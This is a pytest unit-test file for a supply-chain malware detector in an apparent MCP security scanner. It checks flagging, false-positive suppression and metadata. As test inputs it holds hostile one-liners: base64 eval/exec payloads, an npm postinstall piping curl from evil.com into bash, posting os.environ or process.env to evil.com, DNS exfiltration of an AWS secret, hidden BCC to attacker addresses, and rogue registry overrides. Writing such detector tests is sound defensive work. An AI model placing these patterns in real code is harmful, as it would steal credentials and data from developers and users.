"""
Unit tests for SupplyChainDetector.

Covers:
- Encoded payload execution (base64 eval/exec)
- Install-time shell execution (setup.py, npm hooks)
- Install-time network calls
- Covert data exfiltration
- Silent BCC/forward injection
- Dependency confusion (non-standard registries)
- Known typosquatted package names
- False-positive suppression
- Applicability / file type filtering
- Detector metadata
"""

import pytest
from pathlib import Path

from mcp_sentinel.detectors.supply_chain import SupplyChainDetector


@pytest.fixture
def detector():
    return SupplyChainDetector()


# ---------------------------------------------------------------------------
# Detector metadata
# ---------------------------------------------------------------------------

def test_detector_name(detector):
    assert detector.name == "SupplyChainDetector"


def test_detector_enabled_by_default(detector):
    assert detector.enabled is True


# ---------------------------------------------------------------------------
# is_applicable
# ---------------------------------------------------------------------------

def test_applicable_to_python(detector):
    assert detector.is_applicable(Path("server.py")) is True


def test_applicable_to_javascript(detector):
    assert detector.is_applicable(Path("index.js")) is True


def test_applicable_to_typescript(detector):
    assert detector.is_applicable(Path("src/tool.ts")) is True


def test_applicable_to_shell(detector):
    assert detector.is_applicable(Path("install.sh")) is True


def test_applicable_to_setup_py(detector):
    assert detector.is_applicable(Path("setup.py")) is True


def test_applicable_to_package_json(detector):
    assert detector.is_applicable(Path("package.json")) is True


def test_applicable_to_requirements_txt(detector):
    assert detector.is_applicable(Path("requirements.txt")) is True


def test_applicable_to_pyproject_toml(detector):
    assert detector.is_applicable(Path("pyproject.toml")) is True


def test_applicable_to_npmrc(detector):
    assert detector.is_applicable(Path(".npmrc")) is True


def test_not_applicable_to_markdown(detector):
    assert detector.is_applicable(Path("README.md")) is False


def test_not_applicable_to_image(detector):
    assert detector.is_applicable(Path("logo.png")) is False


# ---------------------------------------------------------------------------
# Encoded payload execution
# ---------------------------------------------------------------------------

async def test_detect_eval_base64_python(detector):
    content = "eval(base64.b64decode(payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert len(vulns) >= 1
    assert any(v.severity.value == "critical" for v in vulns)
    assert any("Encoded Payload" in v.title for v in vulns)


async def test_detect_exec_base64_python(detector):
    content = "exec(base64.b64decode(encoded_code))"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) >= 1
    assert any("Encoded Payload" in v.title for v in vulns)


async def test_detect_eval_atob_javascript(detector):
    content = "eval(atob(payload))"
    vulns = await detector.detect(Path("index.js"), content)
    assert len(vulns) >= 1
    assert any("Encoded Payload" in v.title for v in vulns)


async def test_detect_eval_buffer_base64(detector):
    content = "eval(Buffer.from(data, 'base64').toString('utf-8'))"
    vulns = await detector.detect(Path("index.js"), content)
    assert len(vulns) >= 1


async def test_detect_zlib_decompress_base64(detector):
    content = "exec(zlib.decompress(base64.b64decode(compressed_payload)))"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) >= 1
    assert any(v.severity.value == "critical" for v in vulns)


async def test_encoded_payload_line_number_accuracy(detector):
    content = "import os\nimport sys\neval(base64.b64decode(x))\n"
    vulns = await detector.detect(Path("server.py"), content)
    assert any(v.line_number == 3 for v in vulns)


async def test_encoded_payload_code_snippet_captured(detector):
    content = "eval(base64.b64decode(secret_payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert any("base64" in v.code_snippet for v in vulns)


# ---------------------------------------------------------------------------
# Install-time shell execution
# ---------------------------------------------------------------------------

async def test_detect_setup_py_cmdclass(detector):
    content = "class CustomInstall(install):\n    def run(self):\n        os.system('curl http://evil.com')\n\nsetup(cmdclass={'install': CustomInstall})"
    vulns = await detector.detect(Path("setup.py"), content)
    assert len(vulns) >= 1


async def test_detect_npm_postinstall_hook(detector):
    content = '{"scripts": {"postinstall": "curl http://evil.com/exfil | bash"}}'
    vulns = await detector.detect(Path("package.json"), content)
    assert len(vulns) >= 1
    assert any("Install" in v.title for v in vulns)


async def test_detect_subprocess_curl_in_setup(detector):
    content = "subprocess.call(['curl', 'http://evil.com/steal'])"
    vulns = await detector.detect(Path("setup.py"), content)
    assert len(vulns) >= 1


async def test_no_false_positive_npm_build_hook(detector):
    content = '{"scripts": {"postinstall": "node ./scripts/build.js"}}'
    vulns = await detector.detect(Path("package.json"), content)
    # node ./scripts/build.js is a legitimate build step, pattern excludes it
    install_exec_vulns = [v for v in vulns if "Install" in v.title and "Shell" in v.title]
    assert len(install_exec_vulns) == 0


# ---------------------------------------------------------------------------
# Install-time network calls
# ---------------------------------------------------------------------------

async def test_detect_requests_in_setup_py(detector):
    content = "import requests\nrequests.post('http://evil.com', data={'host': socket.gethostname()})"
    vulns = await detector.detect(Path("setup.py"), content)
    assert len(vulns) >= 1
    assert any("Network Call" in v.title for v in vulns)


async def test_detect_urllib_in_setup_py(detector):
    content = "urllib.request.urlopen('http://attacker.com/collect?h=' + hostname)"
    vulns = await detector.detect(Path("setup.py"), content)
    assert len(vulns) >= 1


async def test_no_network_call_outside_setup_py(detector):
    # install_script_network should only fire in setup.py
    content = "requests.get('http://api.example.com/data')"
    vulns = await detector.detect(Path("server.py"), content)
    network_vulns = [v for v in vulns if "Network Call During" in v.title]
    assert len(network_vulns) == 0


# ---------------------------------------------------------------------------
# Covert data exfiltration
# ---------------------------------------------------------------------------

async def test_detect_requests_post_with_os_environ(detector):
    content = "requests.post('http://evil.com', data=os.environ)"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) >= 1
    assert any("Exfiltration" in v.title for v in vulns)
    assert any(v.severity.value == "critical" for v in vulns)


async def test_detect_fetch_with_process_env(detector):
    content = "fetch('https://evil.com', {body: JSON.stringify(process.env)})"
    vulns = await detector.detect(Path("index.js"), content)
    assert len(vulns) >= 1
    assert any("Exfiltration" in v.title for v in vulns)


async def test_detect_dns_exfiltration(detector):
    content = "socket.gethostbyname(b64encode(os.environ['AWS_SECRET_KEY']) + '.evil.com')"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) >= 1


async def test_exfiltration_remediation_contains_rotate(detector):
    content = "requests.post('http://evil.com', data=os.environ)"
    vulns = await detector.detect(Path("server.py"), content)
    exfil = [v for v in vulns if "Exfiltration" in v.title]
    assert any("Rotate" in v.remediation or "rotate" in v.remediation for v in exfil)


# ---------------------------------------------------------------------------
# Silent BCC / forward injection
# ---------------------------------------------------------------------------

async def test_detect_bcc_hardcoded_python(detector):
    content = 'msg["Bcc"] = "attacker@evil.com"'
    vulns = await detector.detect(Path("email_tool.py"), content)
    assert len(vulns) >= 1
    assert any("BCC" in v.title for v in vulns)


async def test_detect_bcc_in_dict_assignment(detector):
    content = "params = {'bcc': 'spy@attacker.com', 'to': recipient}"
    vulns = await detector.detect(Path("mailer.py"), content)
    assert len(vulns) >= 1


async def test_detect_forward_to_hardcoded(detector):
    content = "forward_to = 'data-collector@evil.com'"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) >= 1


async def test_no_false_positive_bcc_comment(detector):
    content = "# BCC: you can add a BCC field here"
    vulns = await detector.detect(Path("server.py"), content)
    bcc_vulns = [v for v in vulns if "BCC" in v.title]
    assert len(bcc_vulns) == 0


# ---------------------------------------------------------------------------
# Dependency confusion
# ---------------------------------------------------------------------------

async def test_detect_extra_index_url_unknown(detector):
    content = "pip install --extra-index-url https://packages.internal-corp.example/simple/ mypackage"
    vulns = await detector.detect(Path("requirements.txt"), content)
    assert len(vulns) >= 1
    assert any("Registry" in v.title for v in vulns)


async def test_detect_npm_registry_override(detector):
    content = 'registry=https://npm.internal.attacker.com/'
    vulns = await detector.detect(Path(".npmrc"), content)
    assert len(vulns) >= 1


async def test_no_false_positive_official_pypi(detector):
    content = "--index-url https://pypi.org/simple/"
    vulns = await detector.detect(Path("requirements.txt"), content)
    confusion_vulns = [v for v in vulns if "Registry" in v.title]
    assert len(confusion_vulns) == 0


async def test_no_false_positive_official_npm_registry(detector):
    content = 'registry=https://registry.npmjs.org/'
    vulns = await detector.detect(Path(".npmrc"), content)
    confusion_vulns = [v for v in vulns if "Registry" in v.title]
    assert len(confusion_vulns) == 0


# ---------------------------------------------------------------------------
# Known typosquatted packages
# ---------------------------------------------------------------------------

async def test_detect_colourama_typosquat(detector):
    content = "import colourama"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) >= 1
    assert any("Typosquat" in v.title for v in vulns)
    assert any(v.severity.value == "high" for v in vulns)


async def test_detect_crossenv_typosquat(detector):
    content = 'const x = require("crossenv")'
    vulns = await detector.detect(Path("index.js"), content)
    assert len(vulns) >= 1
    assert any("Typosquat" in v.title for v in vulns)


async def test_typosquat_references_not_empty(detector):
    content = "import colourama"
    vulns = await detector.detect(Path("server.py"), content)
    typo_vulns = [v for v in vulns if "Typosquat" in v.title]
    assert all(len(v.references) > 0 for v in typo_vulns)


# ---------------------------------------------------------------------------
# False-positive suppression
# ---------------------------------------------------------------------------

async def test_no_false_positive_test_file(detector):
    content = "eval(base64.b64decode(test_payload))"
    vulns = await detector.detect(Path("test_server.py"), content)
    # lines containing "test" are suppressed
    assert len(vulns) == 0


async def test_no_false_positive_example_comment(detector):
    content = "# example: eval(base64.b64decode(x))"
    vulns = await detector.detect(Path("server.py"), content)
    assert len(vulns) == 0


# ---------------------------------------------------------------------------
# Vulnerability metadata quality
# ---------------------------------------------------------------------------

async def test_vulnerability_has_cwe(detector):
    content = "eval(base64.b64decode(payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert all(v.cwe_id is not None for v in vulns)


async def test_vulnerability_has_mitre_attack(detector):
    content = "eval(base64.b64decode(payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert all(len(v.mitre_attack_ids) > 0 for v in vulns)


async def test_vulnerability_has_remediation(detector):
    content = "eval(base64.b64decode(payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert all(v.remediation for v in vulns)


async def test_vulnerability_detector_field(detector):
    content = "eval(base64.b64decode(payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert all(v.detector == "SupplyChainDetector" for v in vulns)


async def test_vulnerability_engine_field(detector):
    content = "eval(base64.b64decode(payload))"
    vulns = await detector.detect(Path("setup.py"), content)
    assert all(v.engine == "static" for v in vulns)
